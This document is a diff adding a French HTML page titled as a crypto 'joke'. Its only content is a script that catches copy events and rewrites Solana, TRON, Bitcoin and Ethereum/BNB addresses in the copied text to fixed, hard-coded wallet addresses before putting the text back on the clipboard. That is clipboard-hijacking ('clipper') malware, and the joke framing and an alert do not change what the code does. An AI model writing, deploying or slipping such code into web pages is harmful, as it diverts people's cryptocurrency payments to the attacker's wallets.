@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLAGUE Crypto</title>
+    <script>
+        document.addEventListener('copy', function (event) {
+            event.preventDefault();
+            var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
+            var modifiedText = replaceCryptoAddresses(pastedText);
+            console.log('Texte collé:', modifiedText);
+            navigator.clipboard.writeText(modifiedText).then(function () {
+                alert('Texte collé et modifié : ' + modifiedText);
+            });
+        });
+
+        function replaceCryptoAddresses(originalText) {
+            // Remplacement de l'adresse Solana (sol)
+            var solAddressRegex = /(?:sol:\s*([a-zA-Z0-9]{44}))\b/g;
+            originalText = originalText.replace(solAddressRegex, 'sol: 3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf');
+
+            // Remplacement de l'adresse TRON (trx)
+            var trxAddressRegex = /(?:trx:\s*([a-zA-Z0-9]{34}))\b/g;
+            originalText = originalText.replace(trxAddressRegex, 'trx: TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr');
+
+            // Remplacement de l'adresse Bitcoin (btc)
+            var btcAddressRegex = /(?:btc:\s*([13][a-zA-Z0-9]{33,44})|btc:\s*([bc][a-zA-Z0-9]{35,}))\b/g;
+            originalText = originalText.replace(btcAddressRegex, 'btc: bc1qdx854625jt6k5s62tcnre6fmsyu6ng4pr6s64f');
+
+            // Remplacement des adresses ETH et BNB
+            var ethBnbAddressRegex = /(?:0x[a-fA-F0-9]{40})\b/g;
+            originalText = originalText.replace(ethBnbAddressRegex, '0x10498445975974690E1EA11AF5447461B12cb588');
+
+            return originalText;
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Ajoutez du contenu ici si nécessaire -->
+</body>
+
+</html>
